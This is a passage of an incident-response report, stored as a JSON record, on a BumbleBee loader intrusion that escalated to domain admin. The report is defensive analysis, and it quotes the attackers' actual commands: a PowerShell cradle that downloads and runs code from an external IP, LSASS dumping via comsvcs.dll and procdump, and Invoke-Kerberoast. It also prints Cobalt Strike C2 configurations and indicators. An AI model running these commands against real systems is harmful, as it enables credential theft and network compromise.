{
    "id": "d1d66856-4004-4090-9967-13f539978b22",
    "created_at": "2023-01-12T15:09:10.428329Z",
    "updated_at": "2025-03-27T02:17:00.415222Z",
    "deleted_at": null,
    "sha1_hash": "edb1350fc65cfa13177f5dfa5fd1bee11f4738c4",
    "title": "2022-08-08 - BumbleBee Roasts Its Way to Domain Admin",
    "authors": "",
    "file_creation_date": "2022-08-18T03:57:03Z",
    "file_modification_date": "2022-08-18T03:57:03Z",
    "file_size": 9257866,
    "plain_text": "# BumbleBee Roasts Its Way to Domain Admin\n\n**[thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/](https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/)**\n\nAugust 8, 2022\n\n[In this intrusion from April 2022, the threat actors used BumbleBee as the initial access](https://malpedia.caad.fkie.fraunhofer.de/details/win.bumblebee)\nvector.\n\n[BumbleBee is a malware loader that was first reported by Google Threat Analysis Group in](https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/)\nMarch 2022. Google TAG attributes this malware to an initial access broker (IAB) dubbed\nEXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193. Read\n[more about BumbleBee here, and](https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming) [here.](https://unit42.paloaltonetworks.com/bumblebee-malware-projector-libra/)\n\nDuring this intrusion, the threat actors gained access using an ISO and LNK file, used\nseveral lateral movement techniques, dumped credentials three different ways, kerberoasted\na domain admin account and dropped/executed a bespoke tool for discovering privilege\nescalation paths.\n\n## Case Summary\n\nIn this intrusion, the threat actors operated in an environment over an 11 day dwell period.\nThe intrusion began with a password protected zipped ISO file that we assess with medium\n[to high confidence due to other reports, likely arrived via an email which included a link to](https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming)\ndownload said zip file.\n\nThe execution phase started with that password protected zip, which after extracting would\nshow the user an ISO file that after the user double clicks would mount like a CD or external\nmedia device on Windows and present the user with a single file named documents in the\ndirectory.\n\n\n-----\n\nWhen the user double clicks or opens the lnk file, they inadvertently start a hidden file, a DLL\n(namr.dll) containing the Bumblebee malware loader. From there, the loader reached out to\nthe Bumblebee C2 servers. At first, things remained fairly quiet, just C2 communications;\nuntil around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on\nthe beachhead host. This Cobalt Strike beacon was subsequently executed and then\nproceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).\nFrom these injected processes, the threat actors began discovery tasks using Windows\nutilities like ping and tasklist.\n\nFour hours after initial access, the threat actor used RDP to access a server using the local\nAdministrator account. The threat actor then deployed AnyDesk, which was the only\nobserved persistence mechanism used during the intrusion. The threat actor then started\n[Active Directory discovery using Adfind.](https://thedfirreport.com/2020/05/08/adfind-recon/)\n\nAfter this activity, the threat actors went silent. Then, the next day, they accessed the server\nvia RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege\nescalation paths on a Windows host.\n\nThe next check in from the threat actors, occurred on the 4th day, where the threat actors\nagain ran VulnRecon, but from the beachhead host instead of the server. AdFind was used\n[again as well. Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\nProgramData folders on multiple hosts in the environment. They then used remote services\nto execute Procdump, which was used to dump LSASS. At this point, the actors appeared to\nbe searching for more access then they currently had. While they were able to move laterally\nto workstations and at least one server, it seemed that they had not yet taken control of an\naccount that provided them the access they were seeking, likely a Domain Admin or similarly\nhighly privileged account.\n\nAfter that activity, the threat actors then disappeared until the 7th day, at which time they\naccessed the server via Anydesk. Again, they executed VulnRecon and then also executed\n[Seatbelt, a red team tool for preforming various host based discovery.](https://github.com/GhostPack/Seatbelt)\n\nOn the final day of the intrusion, the 11th day since the initial entry by the threat actor, they\nappeared to be preparing to act on final objectives. The threat actors used PowerShell to\ndownload and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead\nhost. After injecting into various processes, the threat actors executed the PowerShell\nmodule Invoke-Kerberoast. Next, they used yet another technique to dump LSASS on the\nbeachhead host, this time using a built in Windows tool comsvcs.dll. AdFind was run for a\n3rd time in the network, and then two batch scripts were dropped and run. These batch\nscripts’ purposes were to identify all online servers and workstations in the environment,\noften a precursor to ransomware deployment by creating the target list for that deployment.\n\n\n-----\n\nAfter the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.\nNext, the threat actors used a service account to execute a Cobalt Strike beacon remotely on\na Domain Controller. This service account had a weak password, which was most likely\ncracked offline after being kerberoasted earlier in the intrusion.\n\nThe threat actors were then evicted from the environment before any final actions could be\ntaken. We assess based on the level of access and discovery activity from the final day, the\nlikely final actions would have been a domain wide ransom deployment.\n\n## Services\n\n[We offer multiple services including a Threat Feed service which tracks Command and](https://thedfirreport.com/services/)\nControl frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire,\n[PoshC2, etc. More information on this service and others can be found here.](https://thedfirreport.com/services/)\n\nWe also have artifacts and IOCs available from this case such as pcaps, memory captures,\nfiles, event logs including Sysmon, Kape packages, and more, under our Security\nResearcher and Organization services.\n\n## Timeline\n\n\n-----\n\n-----\n\n[Analysis and reporting completed by @0xtornado and](https://twitter.com/0xtornado) [@MetallicHack](https://twitter.com/MetallicHack)\n\n## Initial Access\n\nThe threat actors managed to get access to the beachhead host after the successful\n[execution of a lnk file within an ISO, which are usually distributed through email campaigns.](https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming)\n\nThe initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once\nmounted, lures the user to open a document.lnk file which will execute the malicious DLL\nloader using the following command line:\n```\nC:\\Windows\\System32\\cmd.exe /c start rundll32 namr.dll,IternalJob\n\n```\n[Running Eric Zimmerman’s tool LECmd revealed additional details related to the threat](https://ericzimmerman.github.io/#!index.md)\nactors. The metadata included TA machine’s hostname, MAC address, and the LNK\ndocument creation date:\n\n\n-----\n\n## Execution\n\n Execution of multiple payloads\n\nThe successful execution of BumbleBee payload (namr.dll) resulted in the dropping and the\nexecution of several payloads using multiple techniques. The graph below shows all the\npayloads dropped by BumbleBee, the way they were executed, and the different processes\nthey injected into:\n\n_Sysmon File Created event showing wab.exe created by rundll32.exe_\n\n\n-----\n\n_Sysmon Event Code 1 showing wab.exe executed by WMI_\n\n\n-----\n\n## Execution of Cobalt Strike\n\nThe following PowerShell one-liner was executed from wab.exe during day 11, which\ndownloaded obfuscated PowerShell and executed it in memory:\n```\nC:\\Windows\\system32\\cmd.exe /C powershell.exe -nop -w hidden -c \"IEX ((new-object\nnet.webclient).downloadstring('http://104.243.33.50:80/a'))\"\n\n```\nSince the download took place over an unencrypted HTTP channel, the network traffic was\nplainly visible.\n\n\n-----\n\nThis payload can be deobfuscated using the following CyberChef recipe:\n```\nRegular_expression('User defined','[a-zA-Z0-9+/=]\n{30,}',true,true,false,false,false,false,'List matches')\n\nFrom_Base64('A-Za-z0-9+/=',true)\n\nGunzip()\n\nLabel('Decode_Shellcode')\n\nRegular_expression('User defined','[a-zA-Z0-9+/=]\n{30,}',true,true,false,false,false,false,'List matches')\n\nConditional_Jump('',false,'',10)\n\nFrom_Base64('A-Za-z0-9+/=',true)\n\nXOR({'option':'Decimal','string':'35'},'Standard',false)\n\n```\nOnce deobfuscated, we can spot the MZRE header, which is part of the default configuration\nof Cobalt Strike:\n\nOne of the easiest ways to extract valuable information from this Shellcode is using Didier\nStevens 1768.py tool:\n\n\n-----\n\nThe command and control server was hosted on (108.62.12[.]174/dofixifa[.]co). The full\nconfig extraction, detailing the Malleable C2 profile, is available in Command and Control\nsection.\n\n## Persistence\n\n**_AnyDesk and its installation as a service was used in order to persist and create a backdoor_**\nto the network.\n\n## Privilege Escalation\n\n GetSystem\n\n\n-----\n\nThreat actors made a mistake by launching the `getsystem command in the wrong console`\n(shell console rather than the beacon console). The parent process of this command was\n```\nC:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc, a\n\n```\nprocess where Cobalt Strike was injected into:\n```\nC:\\Windows\\system32\\cmd.exe /C getsystem\n\n```\nThis command is a built-in Cobalt Strike command that is used to get SYSTEM privileges. A\n[detailed write-up of this feature is documented in the official Cobalt Strike blog and was also](https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/blank)\n[detailed in our Cobalt Strike, a Defender’s Guide blog post.](https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/)\n\n## Valid Accounts\n\nThreat actors obtained and abused credentials of privilege domain accounts as a means of\ngaining privilege escalation on the domain. They also utilized local administrator accounts.\n\nA service account, with Domain Admin permissions, was used to create a remote service on\na Domain Controller to move laterally.\n\n## Defense Evasion\n\n Process Injection\n\nThe process injection technique was used multiple times to inject into different processes.\nAlmost every post-exploitation job was launched from an injected process.\n\nRight after its execution, the wab.exe process created two remote threads in order to inject\ncode into explorer.exe and rundll32.exe:\n\n\n-----\n\n-----\n\nThreat actors also created a remote thread in svchost.exe:\n\n\n-----\n\nMultiple processes were then spawned by :\n```\nC:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc\n\n```\nto perform various techniques (Enumeration, Credential dumping, etc.):\n\n\n-----\n\n[A Yara scan of process memory using the Malpedia Cobalt Strike rule revealed the various](https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike)\ninjections across hosts.\n\nPid ProcessName CommandLine\n\n6832 explorer.exe C:\\Windows\\Explorer.EXE\n\n7476 svchost.exe C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p -s\ncbdhsvc\n\n8088 wab.exe C:\\Users\\USER\\AppData\\Local\\wab.exe\n\n34296 rundll32.exe C:\\Windows\\system32\\rundll32.exe\n\n19284 powershell.exe “c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe”\n-Version 5.1 -s -NoLogo -NoProfile\n\n7316 svchost.exe C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup\n\n7288 svchost.exe C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup -s\nWpnUserService\n\n20400 rundll32.exe C:\\Windows\\System32\\rundll32.exe\n\n## Indicator Removal on Host: File Deletion\n\nWe observed the threat actors deleting their tools (Procdump, Network scanning scripts, etc.)\nfrom hosts.\n\nThe table below shows an example of ProcDump deletion from the ProgramData folder of all\ntargeted workstations after dumping their LSASS process:\n\n## Credential Access\n\n LSASS Dump\n\n\n-----\n\n### MiniDump\n\nThreat actors dumped the LSASS process from the beachhead using the comsvcs.dll\n**MiniDump technique via the** `C:\\Windows\\system32\\svchost.exe -k`\n```\nClipboardSvcGroup -p -s cbdhsvc beacon:\ncmd.exe /C rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 968\nC:\\ProgramData\\REDACTED\\lsass.dmp full\n\n### ProcDump\n\n```\nThreat actors also dropped procdump.exe and procdump64.exe on multiple workstations\nremotely, dumped LSASS, and deleted them from the ProgramData folder:\n\nThe ProcDump utility was executed on those workstations using the following command\nline:\n```\nC:\\programdata\\procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp\n\n## Kerberoasting\n\n```\n**Invoke-Kerberoast command was executed from the beachhead through svchost.exe, a**\nprocess where the threat actors injected:\n\nHere is an extract of PowerShell EventID 800 showing different Invoke-Kerberoast options\nused by threat actors, including HashCat output format:\n\n\n-----\n\n```\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:36177/'); InvokeKerberoast -OutputFormat HashCat | fl | Out-File -FilePath\nC:\\ProgramData\\REDACTED\\ps.txt -append -force -Encoding UTF8\n\n```\nRight after the execution of Invoke-Kerberoast, DC logs show that multiple Kerberos\nService Tickets were requested from the beachhead host, with ticket encryption type set to\n**0x17 (RC4) and ticket options to 0x40810000, for service accounts.**\n\n\n-----\n\nAround 3 hours later, one of the service accounts logged into one of the Domain Controllers\nfrom the beachhead.\n\nWe assess with high confidence that the service account password was weak and cracked\noffline by threat actors.\n\n## Discovery\n\n Reconnaissance\n\n**System Information & Software Discovery**\n\nThe following commands were launched by the wab.exe beacon:\n\n\n-----\n\n```\nwhoami\n\nipconfig /all\n\ntasklist\n\nsysteminfo\n\nwmic product get name,version\n\nwmic /node:<REDACTED> process list brief\n\nnet view \\\\<REDACTED>\\Files$ /all\n\ndir \\\\<REDACTED>\\C$\\\n\n```\nUsing the same beacon, wab.exe, tasklist was also used in order to enumerate processes\non multiple hosts remotely:\n```\ntasklist /v /s <REMOTE_IP>\n\n```\n**Admin Groups and Domains Discovery**\n\nAs we have already observed in multiple cases, the threat actors enumerated the local\nadministrators group and domain privileged (Enterprise and DAs) administrators groups\nmainly using net command:\n```\nnet use\n\nnet group \"Domain computers\" /dom\n\nnet group \"Enterprise admins\" /domain\n\nnet group \"domain admins\" /domain\n\nnet localgroup administrators\n\nnltest /dclist:\n\nnltest /domain_trusts\n\nping -n 1 <REMOTE_IP>\n\n```\n**Opsec mistake**\n\nThreat actors failed on a part of their tasks, by executing the command in the wrong console:\n```\nC:\\Windows\\System32\\rundll32.exe\n\n\n```\n➝ C :\\Windows\\system32\\cmd.exe /C shell whoami /all\n\nWe can assert with high confidence that the recon stage was not fully automated, and threat\nactors manually executed commands and made a mistake in one of those.\n\n\n-----\n\n## AdFind\n\nTo enumerate Active Directory, the threat actors executed AdFind from the beachhead host,\non three different occasions:\n\nThe source of execution, the initiating parent process, was different on each occasion and\nthe name of AdFind binary and the result files were different on one occasion, which could\nindicate multiple Threat actors accessing the network.\n\n\n-----\n\n## Network scanning\n\nThreat actors used two scripts named s.bat (for servers) and w.bat (for workstations) to ping\nthe hosts and store the results in two log files:\n\n**s.bat script:**\n```\n@echo off\n\nfor /f %%i in (servers.txt) do for /f \"tokens=2 delims=[]\" %%j in ('ping -n 1 -4\n\"%%i\"') do @echo %%j >> serv.log\n\n```\n**w.bat script:**\n```\n@echo off\n\nfor /f %%i in (workers.txt) do for /f \"tokens=2 delims=[]\" %%j in ('ping -n 1 -4\n\"%%i\"') do @echo %%j >> work.log\n\n```\nBoth of those scripts were executed from the PowerShell Cobalt Strike beacon\n(powershell.exe).\n\n## Invoke-ShareFinder\n\n[Invoke-ShareFinder is a PowerShell module which is part of PowerView.](https://powersploit.readthedocs.io/en/stable/Recon/README/)\n\nInvoke-ShareFinder – finds (non-standard) shares on hosts in the local domain\n\nThreat actors performed share enumeration using Invoke-ShareFinder.\n```\nIEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:39303/%27);\n\nInvoke-ShareFinder -CheckShareAccess -Verbose | Tee-Object ShareFinder.txt\n\n```\nBecause rundll32.exe executed PowerShell, we can see that rundll32.exe created the\n_ShareFinder.txt output file in C:\\ProgramData\\._\n\n\n-----\n\n## Seatbelt\n\nThe tool [SeatBelt was used by the threat actors on a server in order to discover potential](https://github.com/GhostPack/Seatbelt)\nsecurity misconfigurations.\n\nSeatbelt is a C# project that performs a number of security oriented host-survey “safety\nchecks” relevant from both offensive and defensive security perspectives.\n\nThreat actors performed a full reconnaissance by specifying the flag `-group=all :`\n\n\n-----\n\n```\nSeatbelt.exe group all outputfile C:\\ProgramData\\seatinfo.txt\n\n## VulnRecon\n\n```\nThreat actors dropped two binaries named vulnrecon.dll and vulnrecon.exe on two hosts.\nThis is the first time we’ve observed this tool. This library seems to be a custom tool\ndeveloped to assist threat actors with Windows local privilege escalation enumeration.\n```\nvulnrecon.dll PDB: D:\\a\\_work\\1\\s\\artifacts\\obj\\winx64.Release\\corehost\\cli\\apphost\\standalone\\Release\\apphost.pdb\nvulnrecon.exe PDB: D:\\work\\rt\\VulnRecon\\VulnRecon\\obj\\Release\\net5.0\\VulnRecon.pdb\n\n```\nThe table below summarizes the capabilities of the tool:\n\n**Option/Command** **Details (from the code)**\n\n‘v’ or “Vulnerability” “Search for available vulnerabilities for using LPE tools””Scans the\noperating system for vulnerabilities and displays a list of tools for a\nLPE”\n\n\n‘m’ or\n“MicrosoftUpdates”\n\n\n“List of all installed microsoft updates””Displays a list installed\nMicrosoft updates”\n\n\n‘h’ or “HotFixes” “List of installed hot fixes””Displays a list of installed hot fixes”\n\n\n‘s’ or\n“SupportedCve”\n\n\n“List of implemented tools for LPE “”Displays list of implemented\nCVE for LPE”\n\n\n‘i’ or “SystemInfo” “Display information about current Windows version “\n\n\n-----\n\nBelow is the list of all of the currently supported (or implemented) CVE enumeration via\ninstalled KBs mapping:\n\nThreat actors executed this tool on patient 0 with low-level privileges multiple times, and\nagain on a server with Administrator privileges. Below are all the command lines run by the\nadversaries:\n\n## Lateral Movement\n\n Lateral Tool Transfer\n\nUsing the Cobalt Strike beacon, the threat actors transferred AnyDesk (1).exe file from the\nbeachhead to a server:\n\n\n-----\n\nThe threat actors also transferred ProcDump from the beachhead to multiple workstations:\n\n## Remote Services\n\n### Remote Desktop Protocol\n\nThreat actors used explorer.exe, where they were previously injected into, to initiate a\nproxied RDP connection to a server:\n\n\n-----\n\nThreat actors performed the first lateral movement from the beachhead to the server using\n**RDP with an Administrator account:**\n\n\n-----\n\nThis first lateral movement was performed in order to drop and install AnyDesk.\n\n### SMB/Windows Admin Shares\n\n**Remote Service over RPC**\n\nMultiple RPC connections were initiated from the rundll32.exe process where wab.exe\npreviously injected into:\n\n\n-----\n\nThese RPC connections targeted multiple hosts including workstations servers and DCs\n\n\n-----\n\nAs we can see with one server, which was targeted, the win32 function CreateServiceA was\nused by the malware in order to create a remote service over RPC on the server.\n\n### Cobalt Strike built-in PsExec\n\nThreat actors used the built-in Cobalt Strike `jump psexec command to move laterally. On`\neach usage of this feature, a remote service was created with random alphanumeric\ncharacters, service name and service file name, e.g. “<7-alphanumeric-characters>.exe”.\n\nBelow is an example of the service edc603a that was created on a Domain Controller:\n\nThe account used to perform this lateral movement was one of the kerberoasted service\naccounts.\n\n\n-----\n\nThe service runs a rundll32.exe process without any arguments. This process was\nbeaconing to (108.62.12[.]174/dofixifa[.]co), the second Cobalt Strike C2, used during the\nlast day of this intrusion.\n\nWe observed this beacon performing various techniques (process injections in svchost\nprocess via CreateRemoteThread, default named pipes, etc.)\n\n## Command and Control\n\nThe graph below shows all communications to malicious IP addresses made by the dropped\npayloads or processes which threat actors injected into:\n\n\n-----\n\n## BumbleBee\n```\n142.91.3[.]109\n\n45.140.146[.]30\n\n```\nAll the active Bumblebee command and control shared a common server configuration in\nregards to TLS setup.\n```\nJA3: c424870876f1f2ef0dd36e7e569de906\nJA3s: 61be9ce3d068c08ff99a857f62352f9d\nCertificate: [76:28:77:ff:fe:26:5c:e5:c6:7a:65:01:09:63:44:6d:57:b7:45:f2 ]\nNot Before: 2022/04/12 06:33:52 UTC\nNot After: 2023/04/12 06:33:52 UTC\nIssuer Org: Internet Widgits Pty Ltd\nSubject Org: Internet Widgits Pty Ltd\nPublic Algorithm: rsaEncryption\n\n## Cobalt Strike\n\n```\nCobalt Strike (CS) was extensively used during this intrusion, the threat actors used CS as\nthe main Command and Control tool, dropped several payloads, and injected into multiple\nprocesses on different hosts.\n\n### C2 Servers\n\n\n-----\n\nTwo CS C2 servers were used during this intrusion. The graph below shows beaconing\nactivity over time, we can notice the continuous usage of the first C2 server\n(45.153.243[.]142/fuvataren[.]com) from day 1 and the second C2 server\n(108.62.12[.]174/dofixifa[.]co) during the last day of intrusion only (day 11):\n\nThe main beacon wab.exe:\n```\n45.153.243[.]142\n\nfuvataren[.]com\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [6c:54:cc:ce:ca:da:8b:d3:12:98:13:d5:85:52:81:8a:9d:74:4f:fb ]\nNot Before: 2022/04/15 00:00:00 UTC\nNot After: 2023/04/15 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: fuvataren.com [fuvataren.com,www.fuvataren.com ]\nPublic Algorithm: rsaEncryption\n\n```\nBelow is the Cobalt Strike configuration of this C2 exported from a sandbox analysis results:\n\n\n-----\n\n```\naccess_type: 512\n\nbeacon_type: 2048\n\nhost: fuvataren.com,/rs.js\n\nhttp_header1:\nAAAAEAAAABBIb3N0OiBhbWF6b24uY29tAAAACgAAABFDb25uZWN0aW9uOiBjbG9zZQAAAAoAAAASQWNjZXB0Oi\n\nhttp_header2:\nAAAAEAAAABBIb3N0OiBhbWF6b24uY29tAAAACgAAABFDb25uZWN0aW9uOiBjbG9zZQAAAAoAAAAVQWNjZXB0LU\n\nhttp_method1: GET\n\nhttp_method2: POST\n\njitter: 6144\n\npolling_time: 5000\n\nport_number: 443\n\nsc_process32: %windir%\\syswow64\\rundll32.exe\n\nsc_process64: %windir%\\sysnative\\rundll32.exe\n\nstate_machine:\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5eYxmuxksHBu5Hqtk11PJye1th52fYvmUXmFrL1vEIQs9+B\n\nunknown1\n\n3.025605888e+09\n\nunknown2\n\nAAAABAAAAAIAAAJYAAAAAwAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nuri: /en\n\nuser_agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202\n\nwatermark: 1580103814\n\n```\nThe PowerShell beacon:\n```\n108.62.12[.]174\n\ndofixifa[.]co\nJA3: a0e9f5d64349fb13191bc781f81f42e1\nJA3s: ae4edc6faf64d08308082ad26be60767\nCertificate: [ec:57:c5:ca:b1:ca:fb:88:3e:ce:1d:f3:89:0c:91:e3:1d:0a:75:ec ]\nNot Before: 2022/03/26 00:00:00 UTC\nNot After: 2023/03/26 23:59:59 UTC\nIssuer Org: Sectigo Limited\nSubject Common: dofixifa.com [dofixifa.com,www.dofixifa.com ]\nPublic Algorithm: rsaEncryption\n\n```\n[Full configuration extraction using 1768.py tool:](http://1768.py/)\n\n\n-----\n\n```\nConfig found: xorkey b . 0x00000000 0x000031e0\n\n0x0001 payload type           0x0001 0x0002 8 windows-beacon_httpsreverse_https\n\n0x0002 port               0x0001 0x0002 443\n\n0x0003 sleeptime            0x0002 0x0004 5000\n\n0x0004 maxgetsize            0x0002 0x0004 2796542\n\n0x0005 jitter              0x0001 0x0002 48\n\n0x0007 publickey            0x0003 0x0100\n30819f300d06092a864886f70d010101050003818d0030818902818100990b95ec8c7c882213d9afae50bc\n\n0x0008 server,get-uri          0x0003 0x0100 'dofixifa.com,/ro'\n\n0x0043 DNS_STRATEGY           0x0001 0x0002 0\n\n0x0044 DNS_STRATEGY_ROTATE_SECONDS   0x0002 0x0004 -1\n\n0x0045 DNS_STRATEGY_FAIL_X       0x0002 0x0004 -1\n\n0x0046 DNS_STRATEGY_FAIL_SECONDS    0x0002 0x0004 -1\n\n0x000e SpawnTo             0x0003 0x0010 (NULL ...)\n\n0x001d spawnto_x86           0x0003 0x0040\n'%windir%\\\\syswow64\\\\rundll32.exe'\n\n0x001e spawnto_x64           0x0003 0x0040\n'%windir%\\\\sysnative\\\\rundll32.exe'\n\n0x001f CryptoScheme           0x0001 0x0002 0\n\n0x001a get-verb             0x0003 0x0010 'GET'\n\n0x001b post-verb            0x0003 0x0010 'POST'\n\n0x001c HttpPostChunk          0x0002 0x0004 0\n\n0x0025 license-id            0x0002 0x0004 0\n\n0x0026 bStageCleanup          0x0001 0x0002 1\n\n0x0027 bCFGCaution           0x0001 0x0002 0\n\n0x0009 useragent            0x0003 0x0100 'Mozilla/5.0 (Linux; Android\n8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202'\n\n0x000a post-uri             0x0003 0x0040 '/styles'\n\n0x000b Malleable_C2_Instructions    0x0003 0x0100\n\n Transform Input: [7:Input,4,2:338,3,8]\n\n  Print\n\n  Remove 338 bytes from begin\n\n  BASE64\n\n  NETBIOS lowercase\n\n0x000c http_get_header         0x0003 0x0200\n\n Const_host_header Host: gmw.cn\n\n Const_header Connection: close\n\n Build Metadata: [7:Metadata,8,3,2:wordpress_logged_in=,6:Cookie]\n\n  NETBIOS lowercase\n\n  BASE64\n\n  Prepend wordpress_logged_in=\n\n  Header Cookie\n\n0x000d http_post_header         0x0003 0x0200\n\n Const_host_header Host: gmw.cn\n\n Const_header Connection: close\n\n Const_header Accept-Encoding: gzip\n\n Const_header Content-Type: text/plain\n\n Build Output: [7:Output,15,3,4]\n\n  XOR with 4-byte random key\n\n  BASE64\n\n```\n\n-----\n\n```\n  Print\n\n Build SessionId: [7:SessionId,3,2:__session__id=,6:Cookie]\n\n  BASE64\n\n  Prepend __session__id=\n\n  Header Cookie\n\n0x0036 HostHeader            0x0003 0x0080 (NULL ...)\n\n0x0032 UsesCookies           0x0001 0x0002 1\n\n0x0023 proxy_type            0x0001 0x0002 2 IE settings\n\n0x003a TCP_FRAME_HEADER         0x0003 0x0080 '\\x00\\x04'\n\n0x0039 SMB_FRAME_HEADER         0x0003 0x0080 '\\x00\\x04'\n\n0x0037 EXIT_FUNK            0x0001 0x0002 0\n\n0x0028 killdate             0x0002 0x0004 0\n\n0x0029 textSectionEnd          0x0002 0x0004 155989\n\n0x002a ObfuscateSectionsInfo      0x0003 0x0020\n'\\x00p\\x02\\x00á\\x0b\\x03\\x00\\x00\\x10\\x03\\x00 ·\\x03\\x00\\x00À\\x03\\x00\\x1cÞ\\x03'\n\n0x002b process-inject-start-rwx     0x0001 0x0002 4 PAGE_READWRITE\n\n0x002c process-inject-use-rwx      0x0001 0x0002 32 PAGE_EXECUTE_READ\n\n0x002d process-inject-min_alloc     0x0002 0x0004 12128\n\n0x002e process-inject-transform-x86   0x0003 0x0100\n'\\x00\\x00\\x00\\x05\\x90\\x90\\x90\\x90\\x90'\n\n0x002f process-inject-transform-x64   0x0003 0x0100\n'\\x00\\x00\\x00\\x05\\x90\\x90\\x90\\x90\\x90'\n\n0x0035 process-inject-stub       0x0003 0x0010 '2ÍAíð\\x81\\x0c[_I\\x8eßG1Ìm'\n\n0x0033 process-inject-execute      0x0003 0x0080 '\\x01\\x03\\x04'\n\n0x0034 process-inject-allocation-method 0x0001 0x0002 0\n\n0x0000\n\nGuessing Cobalt Strike version: 4.3 (max 0x0046)\n\n### Default named pipes\n\n```\nThe threat actors used default CS configuration and default named pipes. Named pipes were\ncreated in order to establish communication between CS processes:\n\nIn this particular case, threat actors used default post-exploitation jobs, which have a pattern\nof postex [0-9a-f]{4} .\n\n\n-----\n\nBelow is the full list of all default named pipes spotted during this intrusion:\n```\n\\postex_0dde\n\n\\postex_3e9b\n\n\\postex_4008\n\n\\postex_4429\n\n\\postex_55f8\n\n\\postex_8248\n\n\\postex_8c73\n\n\\postex_972d\n\n\\postex_fc2e\n\n```\nNamed pipes are commonly used by Cobalt Strike to perform various techniques. Here is a\n[Guide to Named Pipes and Hunting for Cobalt Strike Pipes from one of our contributors](https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575)\n[@svch0st.](https://twitter.com/svch0st)\n\n## AnyDesk\n\nAs mentioned before in the lateral tool transfer section, threat actors remotely dropped the\n**_AnyDesk binary on a server from the beachhead:_**\n\n\n-----\n\nA new service was created (Event ID 7045) upon the execution of AnyDesk installer:\n\n**_AnyDesk logs,_** `%ProgramData%\\AnyDesk\\ad_svc.trace and`\n```\n%AppData%\\AnyDesk\\ad.trace, show that it was used during Day 1 and Day 7 of this\n\n```\nintrusion, using the local Administrator account each time. The usage of AnyDesk can be\nrelatively easy to spot if you have the right logs (*.anydesk.com domains, AnyDesk user\nagent, etc.):\n\n\n-----\n\nThe usage of AnyDesk also triggered two ET signatures:\n```\nET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)\n\nET USER_AGENTS AnyDesk Remote Desktop Software User-Agent\n\n```\nAgain, those are quick wins to add to your detection capabilities to detect the usage of\nunauthorized remote administration tools, commonly used by ransomware operators\n\nAnyDesk configuration file and the network logs revealed that the id used was 159889039\nand the source IP was 108.177.235.25 (LeaseWeb USA – Cloud Provider).\n\n## Impact\n\n\n-----\n\nThere was no impact (exfiltration, data encryption, or destruction) during this intrusion.\nHowever, the observed TTPs show common cybercrime threat actors tradecraft which may\nhave lead to domain wide ransomware had the threat actors had enough time.\n\n## Indicators\n\n Files\n\n\n-----\n\n```\nBC_invoice_Report_CORP_46.zip\n\n5226b7138f4dd1dbb9f6953bd75a320b\n\n6c87ca630c294773ab760d88587667f26e0213a3\n\nc1b8e9d77a6aea4fc7bed4a2a48515aa32a3922859c9091cecf1b5f381a87127\n\ndocument.lnk\n\n3466ffaf086a29b8132e9e10d7111492\n\n58739dc62eeac7374db9a8c07df7c7c36b550ce5\n\n90f489452b4fe3f15d509732b8df8cc86d4486ece9aa10cbd8ad942f7880075e\n\nnamr.dll\n\nf856d7e7d485a2fc5b38faddd8c6ee5c\n\nc68e4d5eaae99d6f0a51eec48ace79a4fede3c09\n\n2d67a6e6e7f95d3649d4740419f596981a149b500503cbc3fcbeb11684e55218\n\nwab.exe\n\nc68437cc9ed6645726119c12fdcb33e7\n\n7a3db4b3359b60786fcbdaf0115191502fcded07\n\n1cf28902be615c721596a249ca85f479984ad85dc4b19a7ba96147e307e06381\n\naf.exe\n\n9b02dd2a1a15e94922be3f85129083ac\n\n2cb6ff75b38a3f24f3b60a2742b6f4d6027f0f2a\n\nb1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682\n\nVulnRecon.exe\n\n5839b4013cf6e25568f13d3fc4120795\n\nd9832b46dd6f249191e9cbcfba2222c1702c499a\n\neb4cba90938df28f6d8524be639ed7bd572217f550ef753b2f2d39271faddaef\n\nVulnRecon.dll\n\n951d017ba31ecc6990c053225ee8f1e6\n\na204f20b1c96c5b882949b93eb4ac20d4